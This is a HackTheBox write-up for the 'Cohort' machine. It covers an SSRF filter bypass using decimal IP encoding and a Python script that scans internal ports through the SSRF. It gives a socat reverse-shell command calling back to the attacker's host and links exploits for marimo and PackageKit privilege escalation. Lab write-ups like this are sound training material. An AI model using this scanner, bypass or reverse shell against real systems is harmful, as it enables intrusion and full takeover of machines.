# Cohort - HackTheBox

## Enumeration

- Ports: 22,80,443

### Port 22

SSH

### Port 80

Runs a webserver redirecting to port 443

### Port 443

- Runs `cohort.htb`, and an analytics service.
- On fuzzing we get `/status` which is forbidden.
- There is a `/portal.html` which accepts a url, but it doesn't accept loopback urls like `127.0.0.1` or `localhost`.
- But this can be bypassed via  [decimal ip encoding](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#bypass-using-an-encoded-ip-address) `http://2130706433/`.
- We can use this python script 

```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.exceptions import InsecureRequestWarning
from requests.adapters import HTTPAdapter
from tqdm import tqdm

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

TARGET_IP_INT = 2130706433
BASE_URL = "https://cohort.htb/api/validate"
MAX_WORKERS = 100
TIMEOUT = 3

session = requests.Session()
adapter = HTTPAdapter(pool_connections=MAX_WORKERS, pool_maxsize=MAX_WORKERS, max_retries=0)
session.mount("https://", adapter)
session.mount("http://", adapter)

found_endpts = []

def check_port(port):
    payload = {"url": f"http://{TARGET_IP_INT}:{port}/", "format": "json"}
    try:
        res = session.post(BASE_URL, json=payload, verify=False, timeout=TIMEOUT)
    except requests.RequestException:
        return port, None

    if res.status_code != 200:
        return port, False

    try:
        ok = res.json().get("ok", False)
    except ValueError:
        ok = False

    return port, ok

errors = 0

with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
    futures = {executor.submit(check_port, port): port for port in range(1, 65536)}

    with tqdm(total=len(futures), desc="Scanning ports", unit="port") as pbar:
        for future in as_completed(futures):
            port, ok = future.result()
            if ok is None:
                errors += 1
            elif ok:
                found_endpts.append(port)
                tqdm.write(f"[+] http://{TARGET_IP_INT}:{port}")

            pbar.update(1)
            pbar.set_postfix(found=len(found_endpts), errors=errors)

print(sorted(found_endpts))
```
- Running this gives 2 other ports, 5000 and 8888.
- The `/status` endpoint is also accessible from here, which is forbidden in the public facing webserver.

```javascript
{"service":"cohort-edge","status":"ok","generated_by":"nginx","upstreams":[{"name":"marketing","host":"cohort.htb","root":"/var/www/cohort"},{"name":"insights-api","host":"cohort.htb","path":"/api/","target":"127.0.0.1:5000"},{"name":"notebooks","host":"nb-1be3782a8afd3ad5.cohort.htb","target":"127.0.0.1:8888","note":"internal analyst workspace, not for external use"}]}
```

- This reveals the vhost of the service running on port 8888 `nb-1be3782a8afd3ad5.cohort.htb`.

## Initial Access

### nb-1be3782a8afd3ad5.cohort.htb

- This runs a service called marimo vulnerable to [this exploit](https://github.com/jasonbernier/CVE-2026-39987/blob/main/exploit.py).
- But while running commands it all gets cut short, terminating the reverse shell. 
- To gain a persistent shell I uploaded `socat` and then ran this:

```bash
nohup ./socat TCP:<your-ip>:4444 EXEC:bash >/tmp/socat.log 2>&1 &
```

- Run this after starting a listener on port 4444. This will create a persistent reverse shell connection/
- Read the user flag from this.


## Privilege Escalation

- Running LinPEAS on the box gives this:

```
Vulnerable to CVE-2026-41651 (Pack2TheRoot) - PackageKit 1.2.8-2ubuntu1.2 is below the Ubuntu 24.04 fixed version: 1.2.8-2ubuntu1.5
```

- Use [this exploit](https://github.com/shibaaa204/Pack2TheRoot/blob/main/exploit.py) to get a root shell.

Happy Hacking :)
